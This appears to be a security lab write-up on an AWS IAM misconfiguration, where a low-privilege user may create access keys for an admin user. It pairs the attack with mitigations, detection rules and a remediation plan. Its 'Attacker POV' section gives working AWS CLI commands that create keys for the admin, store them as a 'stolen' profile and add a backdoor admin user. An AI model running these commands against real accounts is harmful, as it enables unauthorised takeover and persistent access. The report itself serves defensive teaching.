# iam_privesc_by_key_rotation — Misconfiguration Report

## Environment Overview

A simple AWS environment containing IAM resources designed to demonstrate privilege escalation through IAM access key rotation:

- **IAM User (Bob)** — A low-privilege user account with limited permissions, representing a standard developer or contractor account
- **IAM User (John)** — An administrative user with elevated privileges
- **IAM Policies** — Custom policies granting specific IAM permissions to the low-privilege user

---

## Attack Chain Summary

```
Low-Privilege User (Bob)
    ↓ has permission
CreateAccessKey on John
    ↓ creates new credentials
Admin User Credentials (John)
    ↓ assumes identity
Administrative Access
    ↓ performs
Privileged Actions (List/Delete/Modify Resources)
```

### Exploit Steps

1. The attacker gains access to the low-privilege IAM user "Bob" credentials through social engineering, credential stuffing, or a compromised developer workstation.
2. The attacker enumerates IAM permissions and discovers that Bob has `iam:CreateAccessKey` permission on the high-privilege user "John".
3. The attacker uses the AWS CLI to create a new access key pair for John without needing to know John's current credentials or password.
4. With the newly created access keys, the attacker configures a new AWS CLI profile with John's administrative permissions.
5. The attacker now has full administrative access to the AWS account and can list, modify, or delete resources, create new users, or pivot to other services.
6. The legitimate John user may not notice the new access key for days or weeks, allowing prolonged unauthorized access.

### Attacker POV

```bash
# Step 1: List current user permissions
aws iam get-user
aws iam list-attached-user-policies --user-name Bob

# Step 2: Enumerate IAM users to find high-privilege targets
aws iam list-users

# Step 3: Create new access key for target user (John)
aws iam create-access-key --user-name John

# Step 4: Configure stolen credentials in new profile
aws configure --profile John_stolen
# Enter the AccessKeyId and SecretAccessKey from step 3

# Step 5: Verify escalated privileges
aws sts get-caller-identity --profile John_stolen
aws iam list-users --profile John_stolen

# Step 6: Perform privileged actions
aws s3 ls --profile John_stolen
aws ec2 describe-instances --profile John_stolen
aws iam create-user --user-name backdoor-admin --profile John_stolen
```

---

## Misconfiguration Findings

### 1. Overly Permissive IAM Policy: CreateAccessKey on Other Users

**What:** The low-privilege user "Bob" has been granted `iam:CreateAccessKey` permission on the administrative user "John". This permission allows Bob to generate new access credentials/access key pairs for John without requiring John's password or existing credentials.

**IAM Policy Example:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:CreateAccessKey",
      "Resource": "arn:aws:iam::*:user/John"
    }
  ]
}
```

This permission is almost never legitimately required. If a user needs to create access keys, they should only be able to create them for **themselves** (`iam:CreateAccessKey` on `aws:username = ${aws:username}`), not for other users.

**Mitigation:** Remove the `CreateAccessKey` permission on other users. If key rotation is required, implement an automated key rotation system using AWS Secrets Manager or Lambda functions rather than granting users direct IAM permissions on other accounts.

**Proper Policy (Self-Service Key Rotation Only):**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:CreateAccessKey",
      "Resource": "arn:aws:iam::*:user/${aws:username}"
    }
  ]
}
```

**Why bother:** The `CreateAccessKey` permission on other users is a direct privilege escalation vector. Once an attacker has this permission, they can impersonate any user in the IAM policy resource list, completely bypassing password requirements and MFA.

---

### 2. Lack of Monitoring and Alerting on IAM Key Creation

**What:** There is no CloudWatch alarm, CloudTrail alert, or Security Hub finding configured to detect when new IAM access keys are created, especially for administrative users. This allows attackers to silently create credentials without triggering any alerts.

**Mitigation:** Configure CloudWatch Events or EventBridge rules to monitor CloudTrail for `CreateAccessKey` API calls. Send alerts to SNS topics, Lambda functions, or security teams when new keys are created for sensitive users.

**Example EventBridge Rule:**
```json
{
  "source": ["aws.iam"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["CreateAccessKey"],
    "requestParameters": {
      "userName": ["John", "admin", "root"]
    }
  }
}
```

**Why bother:** Without monitoring, attackers can maintain persistent access for extended periods. If you can't detect the attack, you can't stop it.

---

### 3. Missing IAM Access Key Rotation Policies

**What:** The environment has no enforced policy requiring periodic rotation of IAM access keys. Long-lived credentials increase the window of opportunity for attackers if keys are compromised.

**Mitigation:** 
- Enable AWS Config rule `access-keys-rotated` to flag keys older than 90 days
- Implement automated key rotation using AWS Secrets Manager or custom Lambda functions
- Use temporary credentials (STS AssumeRole) instead of long-lived access keys wherever possible
- For human users, enforce console login with MFA instead of programmatic access keys

**Why bother:** Long-lived credentials are a security liability. Temporary credentials limit the blast radius of a compromise as even if stolen, they expire automatically.

---

### 4. No Principle of Least Privilege

**What:** The administrative user "John" likely has far more permissions than required for day-to-day operations. Overly broad administrative access means that privilege escalation results in maximum damage.

**Mitigation:** 
- Implement fine-grained IAM policies based on actual job requirements
- Use IAM Access Analyzer to identify unused permissions
- Separate administrative tasks into specific roles that can be assumed temporarily
- Replace `AdministratorAccess` with custom policies scoped to specific resources and actions

**Why bother:** Defense in depth. Even if an attacker escalates privileges, limiting what those privileges can do reduces potential damage.

---

## Severity & Impact

| Factor | Reality |
|--------|---------|
| Skill Required | Low/Basic AWS CLI knowledge |
| Exploit Time | < 5 minutes |
| Detection Likelihood | Low (without proper monitoring) |
| Persistence | High (keys remain valid until manually deleted) |
| Blast Radius | Entire AWS account (via administrative access) |
| Data at Risk | All S3 buckets, EC2 instances, databases, and AWS resources |

The attack requires only:
- Compromised credentials for a low-privilege user
- Basic knowledge of AWS CLI commands
- No custom tooling or exploits

---

## Detection Indicators

### CloudTrail Events to Monitor:
```
EventName: CreateAccessKey
userIdentity.principalId: AIDAI... (Bob's user ID)
requestParameters.userName: John
```

### Indicators of Compromise (IOCs):
- Multiple access keys associated with a single IAM user (especially administrative users)
- Access keys created outside of normal business hours
- API calls from unexpected geographic locations
- `CreateAccessKey` calls from users who should not have this permission

---

## Real-World Precedent

**Similar Attacks:**
- **Uber 2022 Breach:** Attacker compromised contractor credentials, escalated privileges through IAM misconfigurations, accessed internal systems
- **Capital One 2019:** Initial foothold via SSRF, but lateral movement facilitated by overly permissive IAM roles
- **Numerous Red Team Exercises:** IAM privilege escalation is consistently identified as a critical attack vector in AWS environments

**Common Mistake:** Organizations grant `iam:CreateAccessKey` for "convenience" during onboarding or automation, then forget to remove it.

---

## Remediation Priority

### Immediate (< 24 hours):
1. Audit all IAM policies for `CreateAccessKey` permissions
2. Remove `CreateAccessKey` on other users from all policies
3. Rotate all access keys for administrative users (John)
4. Review CloudTrail logs for unauthorized `CreateAccessKey` events in the past 90 days

### Short-term (< 1 week):
1. Implement CloudWatch/EventBridge monitoring for IAM key creation
2. Enable AWS Config rule `access-keys-rotated`
3. Conduct IAM permission review using IAM Access Analyzer
4. Document legitimate use cases for `CreateAccessKey` permission

### Long-term (< 1 month):
1. Migrate to temporary credentials (STS AssumeRole) where possible
2. Implement automated access key rotation
3. Enforce MFA for all administrative actions
4. Conduct security awareness training on IAM best practices

---

## Bottom Line

This configuration presents a **high severity** finding due to:
- Direct privilege escalation path from low-privilege to administrative access
- Low attack complexity (basic AWS CLI knowledge)
- High persistence (keys remain valid indefinitely)
- Minimal detection without proper monitoring

**Impact:** An attacker with access to Bob's credentials can gain full administrative access to the AWS account in under 5 minutes with zero traces if monitoring is not configured.

**Key Takeaway:** IAM permissions should follow the principle of least privilege. The `CreateAccessKey` permission on other users is almost never legitimate and should be treated as a critical misconfiguration.